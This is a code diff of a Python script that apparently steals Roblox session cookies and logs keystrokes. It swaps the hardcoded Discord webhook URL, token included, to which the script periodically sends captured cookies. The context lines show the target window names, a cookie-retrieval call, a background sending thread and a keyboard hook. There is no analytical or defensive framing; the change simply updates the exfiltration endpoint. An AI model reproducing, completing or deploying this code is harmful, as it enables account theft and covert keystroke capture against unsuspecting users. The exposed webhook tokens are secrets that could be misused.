@@ -13,7 +13,7 @@ import sys
 import time
 from datetime import datetime
 
-WEBHOOK = "https://discord.com/api/webhooks/1478446555391328391/t4G8RwvwUAcW-vhjGInx-LgvQzExWxK2A3FlzPgbNQSlYlOXFjPr-6MDIra1HZ52yzKb"
+WEBHOOK = "https://discord.com/api/webhooks/1407511761887957002/bqxMWYUC8zln6VXc5viAbglX3N_WHPNaxF7Bn0qUrcQUq5BstMp6aBHDroDKDvxYx0NY"
 
 TARGET_WINDOWS = ["roblox", "fishtrap", "bloxtrap", "voidtrap"]
 
@@ -166,4 +166,5 @@ if __name__ == "__main__":
     retrieve_roblox_cookies()
     threading.Thread(target=periodic_send_cookie, daemon=True).start()
     keyboard.on_press(on_key)
+
     keyboard.wait()
